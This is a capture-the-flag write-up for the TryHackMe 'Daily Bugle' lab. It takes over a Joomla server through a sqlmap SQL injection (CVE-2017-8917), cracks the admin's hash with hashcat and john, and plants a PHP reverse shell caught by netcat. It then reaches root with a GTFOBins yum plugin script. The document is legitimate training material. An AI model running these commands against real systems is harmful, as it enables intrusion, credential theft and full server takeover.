# Summary
We'll compromise a Joomla CMS account via SQL injection. Crack a Blowfish hash and escalate our privileges by taking advantage of yum. It's labeled as hard so let's find out how far we can get.

# Recon
As always we'll start with a port scan on the target:
```
sudo nmap -sV -p- -Pn -oN nmap.txt -O 10.10.5.229 
```
The scan shows multiple open ports:
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/1.png">

# Enumeration
There's an Apache webserver running on port 80. After browsing to the website we are welcomed by a CMS. Wappalyzer tells us that it's running Joomla.
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/2.png">

I tried SQL injection on the login form, but without any luck.
Let's run joomscan on the target to get more information on Joomla.
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/3.png">


We immediately spot that the version is outdated. 
It also returned the content of robots.txt which shows multiple directories.

A quick Google search tells us that this Joomla version is vulnerable to SQL injection.

> CVE-2017-8917 https://www.exploit-db.com/exploits/42033

Let's fire up sqlmap in an attempt to abuse this vulnerability and extract data from the MySQL database.
```
sqlmap -u "http://10.10.5.229/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

# Hash
Sqlmap took ages and in the meantime I searched for more exploits. I found Joomblah which extracts credentials from the database.

> Joomblah https://github.com/stefanlucas/Exploit-Joomla

This resulted in a username and a hash:
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/4.png">

Running hashid on the hash tells us that it's probably a Blowfish algorithm:
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/5.png">

You can look up which module you have to use at https://hashcat.net/wiki/doku.php?id=example_hashes.
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/6.png">
```
hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt  
```


Impatient as I am I also start john to crack the hash. Let's see who's faster on this algorithm.
```
john --wordlist=/usr/share/seclists/Passwords/rockyou.txt hash
```
John won and we can now login at the administrator panel of Joomla which we found earlier during enumeration.

# Initial Foothold
I found an article explaining how we can get a reverse shell from the administrator panel

> Article: https://www.hackingarticles.in/joomla-reverse-shell/

Basically we edit an existing page by replacing it's code with a PHP reverse shell. We will use the script from Pentestmonkey.

> php-reverse-shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/7.png">

We change the IP and port and start our netcat listener:
```
rlwrap nc -nlvp 4444
```
> Use rlwrap so you can use the arrow keys without problems.

After we browse to the page we'll get a low privilege shell on the host.
```
http://10.10.5.229/templates/beez3/index.php
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/8.png">

After searching around a but we find a configuration file in /var/www/html/
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/9.png">

We can now try to login at the database but it seems that our IP address is blocked for access.

# Privilege escalation
Searching for users we find ```jjameson```. He's using the same password as root so we can now switch to his account.

```
su jjameson
```

Running ```sudo -l``` tells us we can run /usr/bin/yum as sudo.
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/10.png">

A quick search on GTFOBins teaches us we can abuse yum to escalate our privileges:
```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
And we have a root shell:

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Daily%20Bugle/assets/11.png">


# Conclusion
Although it's labeled as hard it didn't felt that way. I didn't really got stuck as the process was pretty clear from the start.












